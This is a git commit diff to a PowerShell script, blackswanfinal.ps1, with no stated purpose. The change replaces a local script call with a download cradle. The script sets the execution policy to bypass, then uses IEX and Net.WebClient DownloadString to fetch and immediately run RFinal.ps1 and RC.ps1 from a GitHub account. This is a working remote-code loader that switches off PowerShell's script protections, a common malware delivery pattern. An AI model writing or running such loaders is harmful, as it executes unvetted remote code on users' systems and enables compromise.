bd3fe25458935900aac82e478026097ab90d9351
section10housing <68567390+section10housing@users.noreply.github.com>
2020-09-01 14:26:37 +0000

    Update blackswanfinal.ps1

--- blackswanfinal.ps1
+++ blackswanfinal.ps1
@@ -1,4 +1,3 @@
-set-executionpolicy -executionpolicy bypass -scope currentuser -force
-cd $env:userprofile\desktop
-.\R1.ps1
+set-executionpolicy -executionpolicy bypass -scope currentuser -force;
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/section10housing/b1/master/RFinal.ps1');
 IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/section10housing/b1/master/RC.ps1')
